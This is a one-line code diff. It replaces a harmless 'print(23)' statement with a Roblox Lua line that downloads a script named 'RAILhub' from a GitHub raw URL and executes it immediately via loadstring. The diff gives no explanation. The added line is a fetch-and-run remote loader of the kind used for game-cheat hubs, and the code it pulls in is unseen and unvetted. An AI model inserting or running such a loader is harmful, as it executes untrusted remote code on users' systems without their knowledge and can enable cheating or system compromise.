@@ -1,1 +1,1 @@
-print(23)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AZX0OZ/keyrh/main/RAILhub"))()
